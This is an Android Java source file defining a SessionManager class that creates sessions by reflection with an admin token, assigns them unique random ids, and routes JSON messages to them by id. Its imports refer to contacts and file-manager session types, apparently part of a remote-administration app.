package com.lyrnic.userside.managers;

import android.content.Context;

import com.lyrnic.userside.constants.Constants;
import com.lyrnic.userside.listeners.OnRequestSendMessageListener;
import com.lyrnic.userside.listeners.OnSessionCloseListener;
import com.lyrnic.userside.sessions.ContactsSession;
import com.lyrnic.userside.sessions.FileManagerSession;
import com.lyrnic.userside.sessions.Session;

import org.json.JSONException;
import org.json.JSONObject;

import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Random;
import java.util.Set;

public class SessionManager implements OnSessionCloseListener {
    public ArrayList<Session> sessions = new ArrayList<>();
    private final Set<Integer> sessionIds = new HashSet<>();
    private final Random random = new Random();
    OnRequestSendMessageListener onRequestSendMessageListener;
    Context context;
    public SessionManager(Context context) {
        this.context = context;
    }
    public int createSession(Class<?> sessionType, String adminToken) {
        try {
            Session session = (Session) sessionType.getConstructor(Context.class, String.class, OnRequestSendMessageListener.class, int.class).newInstance(context, adminToken, onRequestSendMessageListener, generateSessionId());

            session.setOnSessionCloseListener(this);

            sessions.add(session);

            return session.getId();
        } catch (IllegalAccessException | InstantiationException
                 | InvocationTargetException | NoSuchMethodException e) {
            throw new RuntimeException(e);
        }

    }
    public synchronized int generateSessionId() {
        int id;
        do {
            id = random.nextInt(1000000);
        } while (sessionIds.contains(id));
        sessionIds.add(id);
        return id;
    }

    public void sendToSession(String message) throws JSONException {
        JSONObject json = new JSONObject(message);

        int sessionId = json.getInt(Constants.SESSION_ID_KEY);

        for(Session session : sessions){
            if(session.getId() == sessionId){
                session.onMessageReceived(message);
                break;
            }
        }
    }

    public void setOnRequestSendMessageListener(OnRequestSendMessageListener onRequestSendMessageListener) {
        this.onRequestSendMessageListener = onRequestSendMessageListener;
    }

    @Override
    public void onClose(Session session) {
        sessions.remove(session);
        sessionIds.remove(session.getId());
    }
}
